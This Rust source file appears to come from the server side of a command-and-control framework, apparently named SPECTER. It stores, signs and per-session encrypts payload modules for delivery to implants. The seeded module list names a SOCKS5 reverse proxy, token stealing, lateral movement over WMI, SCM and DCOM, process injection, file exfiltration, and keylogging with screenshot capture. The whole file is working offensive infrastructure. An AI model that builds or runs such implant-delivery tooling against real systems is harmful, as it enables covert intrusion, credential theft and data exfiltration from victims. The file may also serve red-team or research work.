use chrono::Utc;
use ed25519_dalek::{Signer, SigningKey};
use sqlx::sqlite::SqliteRow;
use sqlx::{Row, SqlitePool};
use x25519_dalek::{EphemeralSecret, PublicKey};

use chacha20poly1305::aead::{Aead, KeyInit};
use chacha20poly1305::{ChaCha20Poly1305, Nonce};

/// Module type identifiers matching the implant's MODULE_TYPE_* constants.
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ModuleType {
    Pic = 0,
    Coff = 1,
}

impl ModuleType {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Self {
        match s.to_uppercase().as_str() {
            "COFF" => ModuleType::Coff,
            _ => ModuleType::Pic,
        }
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            ModuleType::Pic => "PIC",
            ModuleType::Coff => "COFF",
        }
    }

    pub fn as_u32(&self) -> u32 {
        *self as u32
    }
}

/// Wire format magic and version constants matching the implant.
const MODULE_MAGIC: u32 = 0x43455053; // "SPEC" little-endian
const MODULE_VERSION: u32 = 1;

/// Stored module metadata.
#[derive(Debug, Clone)]
pub struct StoredModule {
    pub module_id: String,
    pub name: String,
    pub version: String,
    pub module_type: String,
    pub description: String,
    pub blob_size: usize,
    pub created_at: i64,
    pub updated_at: i64,
}

/// Module repository: stores, signs, and packages modules for delivery.
pub struct ModuleRepository {
    pool: SqlitePool,
    signing_key: SigningKey,
}

impl ModuleRepository {
    pub fn new(pool: SqlitePool) -> Self {
        // Generate a signing key pair for Ed25519.
        // In production, this would be loaded from persistent storage.
        let signing_key = SigningKey::generate(&mut rand::thread_rng());
        Self { pool, signing_key }
    }

    /// Create with an explicit signing key (for deterministic testing).
    pub fn with_signing_key(pool: SqlitePool, signing_key: SigningKey) -> Self {
        Self { pool, signing_key }
    }

    /// Return the Ed25519 verification (public) key bytes.
    /// This must be embedded in the implant config at build time.
    pub fn signing_pubkey_bytes(&self) -> [u8; 32] {
        self.signing_key.verifying_key().to_bytes()
    }

    /// Store a module blob in the repository.
    pub async fn store_module(
        &self,
        name: &str,
        version: &str,
        module_type: ModuleType,
        description: &str,
        blob: &[u8],
    ) -> Result<String, sqlx::Error> {
        let id = uuid::Uuid::new_v4().to_string();
        let now = Utc::now().timestamp();

        // Sign the raw blob with Ed25519
        let signature = self.signing_key.sign(blob);

        sqlx::query(
            "INSERT INTO module_repository \
             (module_id, name, version, module_type, description, blob, signature, \
              created_at, updated_at) \
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
        )
        .bind(&id)
        .bind(name)
        .bind(version)
        .bind(module_type.as_str())
        .bind(description)
        .bind(blob)
        .bind(signature.to_bytes().as_slice())
        .bind(now)
        .bind(now)
        .execute(&self.pool)
        .await?;

        Ok(id)
    }

    /// Get module metadata by ID.
    pub async fn get_module(&self, module_id: &str) -> Result<Option<StoredModule>, sqlx::Error> {
        let row = sqlx::query(
            "SELECT module_id, name, version, module_type, description, \
             length(blob) as blob_size, created_at, updated_at \
             FROM module_repository WHERE module_id = ?",
        )
        .bind(module_id)
        .fetch_optional(&self.pool)
        .await?;

        Ok(row.as_ref().map(row_to_stored_module))
    }

    /// List all modules in the repository.
    pub async fn list_modules(&self) -> Result<Vec<StoredModule>, sqlx::Error> {
        let rows = sqlx::query(
            "SELECT module_id, name, version, module_type, description, \
             length(blob) as blob_size, created_at, updated_at \
             FROM module_repository ORDER BY created_at DESC",
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(rows.iter().map(row_to_stored_module).collect())
    }

    /// Package a module for delivery to an implant session.
    ///
    /// Creates the MODULE_PACKAGE wire format:
    ///   [4B magic][4B version][4B module_type][4B encrypted_size]
    ///   [32B ephemeral X25519 pubkey][64B Ed25519 signature]
    ///   [encrypted payload]
    ///
    /// The encrypted payload uses the session's X25519 public key for
    /// per-session key agreement, then ChaCha20-Poly1305 AEAD encryption.
    pub async fn package_module(
        &self,
        module_id: &str,
        session_pubkey: &[u8; 32],
    ) -> Result<Vec<u8>, String> {
        // Fetch the module blob
        let row =
            sqlx::query("SELECT blob, module_type FROM module_repository WHERE module_id = ?")
                .bind(module_id)
                .fetch_optional(&self.pool)
                .await
                .map_err(|e| format!("DB error: {e}"))?
                .ok_or_else(|| "Module not found".to_string())?;

        let blob: Vec<u8> = row.get("blob");
        let module_type_str: String = row.get("module_type");
        let module_type = ModuleType::from_str(&module_type_str);

        // Generate ephemeral X25519 keypair for this packaging
        let ephemeral_secret = EphemeralSecret::random_from_rng(rand::thread_rng());
        let ephemeral_pubkey = PublicKey::from(&ephemeral_secret);

        // X25519 key agreement with session's public key
        let implant_pub = PublicKey::from(*session_pubkey);
        let shared_secret = ephemeral_secret.diffie_hellman(&implant_pub);

        // Derive encryption key via HKDF-SHA256
        let derived_key = hkdf_module_derive(shared_secret.as_bytes());

        // Encrypt the module blob with ChaCha20-Poly1305
        let nonce_bytes: [u8; 12] = rand::random();
        let nonce = Nonce::from_slice(&nonce_bytes);

        let cipher = ChaCha20Poly1305::new_from_slice(&derived_key)
            .map_err(|e| format!("Cipher init error: {e}"))?;

        // Build AAD from the header fields (magic + version + type + encrypted_size placeholder)
        // We'll compute the real AAD after knowing encrypted_size
        let encrypted = cipher
            .encrypt(nonce, blob.as_slice())
            .map_err(|e| format!("Encryption error: {e}"))?;

        // encrypted = ciphertext || tag (chacha20poly1305 crate appends tag)
        // Wire format payload: [12B nonce][ciphertext][16B tag]
        // But the crate gives us [ciphertext || tag], so we need to extract
        let tag_size = 16;
        let ct_len = encrypted.len() - tag_size;
        let ciphertext = &encrypted[..ct_len];
        let tag = &encrypted[ct_len..];

        // Build encrypted payload: [12B nonce][ciphertext][16B tag]
        let mut enc_payload = Vec::with_capacity(12 + encrypted.len());
        enc_payload.extend_from_slice(&nonce_bytes);
        enc_payload.extend_from_slice(ciphertext);
        enc_payload.extend_from_slice(tag);

        let encrypted_size = enc_payload.len() as u32;

        // Sign the encrypted payload with Ed25519
        let signature = self.signing_key.sign(&enc_payload);

        // Build the wire format package
        let header_size = 4 + 4 + 4 + 4 + 32 + 64; // 112 bytes
        let mut package = Vec::with_capacity(header_size + enc_payload.len());

        // Header
        package.extend_from_slice(&MODULE_MAGIC.to_le_bytes());
        package.extend_from_slice(&MODULE_VERSION.to_le_bytes());
        package.extend_from_slice(&module_type.as_u32().to_le_bytes());
        package.extend_from_slice(&encrypted_size.to_le_bytes());
        package.extend_from_slice(ephemeral_pubkey.as_bytes());
        package.extend_from_slice(&signature.to_bytes());

        // Encrypted payload
        package.extend_from_slice(&enc_payload);

        Ok(package)
    }

    /// Get module metadata by name.
    pub async fn get_module_by_name(
        &self,
        name: &str,
    ) -> Result<Option<StoredModule>, sqlx::Error> {
        let row = sqlx::query(
            "SELECT module_id, name, version, module_type, description, \
             length(blob) as blob_size, created_at, updated_at \
             FROM module_repository WHERE name = ?",
        )
        .bind(name)
        .fetch_optional(&self.pool)
        .await?;

        Ok(row.as_ref().map(row_to_stored_module))
    }

    /// Get module ID by name (for packaging).
    pub async fn get_module_id_by_name(&self, name: &str) -> Result<Option<String>, sqlx::Error> {
        let row = sqlx::query("SELECT module_id FROM module_repository WHERE name = ?")
            .bind(name)
            .fetch_optional(&self.pool)
            .await?;

        Ok(row.map(|r| r.get("module_id")))
    }

    /// Seed the repository with built-in module definitions.
    /// Modules are registered as stubs (empty blobs) if the compiled .bin files
    /// are not available. In production, the actual PIC blobs would be loaded
    /// from the implant build output.
    pub async fn seed_default_modules(&self) -> Result<(), sqlx::Error> {
        let defaults = [
            (
                "socks5",
                "1.0.0",
                ModuleType::Pic,
                "SOCKS5 reverse proxy — tunnel traffic through the implant",
            ),
            (
                "token",
                "1.0.0",
                ModuleType::Pic,
                "Token manipulation — steal, make, revert, list tokens",
            ),
            (
                "lateral",
                "1.0.0",
                ModuleType::Pic,
                "Lateral movement — WMI, SCM, DCOM, scheduled tasks",
            ),
            (
                "inject",
                "1.0.0",
                ModuleType::Pic,
                "Process injection — CreateThread, APC, thread hijack, module stomp",
            ),
            (
                "exfil",
                "1.0.0",
                ModuleType::Pic,
                "Exfiltration — file and directory exfil with LZ4+SHA256",
            ),
            (
                "collect",
                "1.0.0",
                ModuleType::Pic,
                "Collection — keylogger and screenshot capture",
            ),
        ];

        for (name, version, module_type, description) in &defaults {
            // Skip if already registered
            if let Ok(Some(_)) = self.get_module_by_name(name).await {
                continue;
            }

            // Try to load the compiled .bin from the build output
            let bin_path = format!("implant/build/modules/{}.bin", name);
            let blob = std::fs::read(&bin_path).unwrap_or_else(|_| {
                // Use a stub blob so the module is still registered in the DB
                vec![0xCC; 16]
            });

            self.store_module(name, version, *module_type, description, &blob)
                .await?;
        }

        Ok(())
    }

    /// Delete a module from the repository.
    pub async fn delete_module(&self, module_id: &str) -> Result<(), sqlx::Error> {
        sqlx::query("DELETE FROM module_repository WHERE module_id = ?")
            .bind(module_id)
            .execute(&self.pool)
            .await?;
        Ok(())
    }
}

/// HKDF-SHA256 key derivation for module encryption.
/// Uses the same salt/info as the implant's loader_decrypt_package.
fn hkdf_module_derive(shared_secret: &[u8]) -> [u8; 32] {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    type HmacSha256 = Hmac<Sha256>;

    // Extract: PRK = HMAC-SHA256(salt="SPECTER-MODULE", IKM=shared_secret)
    let salt = b"SPECTER-MODULE";
    let mut mac = <HmacSha256 as Mac>::new_from_slice(salt).expect("HMAC accepts any key size");
    mac.update(shared_secret);
    let prk = mac.finalize().into_bytes();

    // Expand: OKM = HMAC-SHA256(PRK, info="module-decrypt" || 0x01)
    let mut mac2 = <HmacSha256 as Mac>::new_from_slice(&prk).expect("HMAC accepts any key size");
    mac2.update(b"module-decrypt");
    mac2.update(&[0x01]);
    let okm = mac2.finalize().into_bytes();

    let mut key = [0u8; 32];
    key.copy_from_slice(&okm);
    key
}

fn row_to_stored_module(row: &SqliteRow) -> StoredModule {
    let blob_size: i64 = row.get("blob_size");
    StoredModule {
        module_id: row.get("module_id"),
        name: row.get("name"),
        version: row.get("version"),
        module_type: row.get("module_type"),
        description: row.get("description"),
        blob_size: blob_size as usize,
        created_at: row.get("created_at"),
        updated_at: row.get("updated_at"),
    }
}
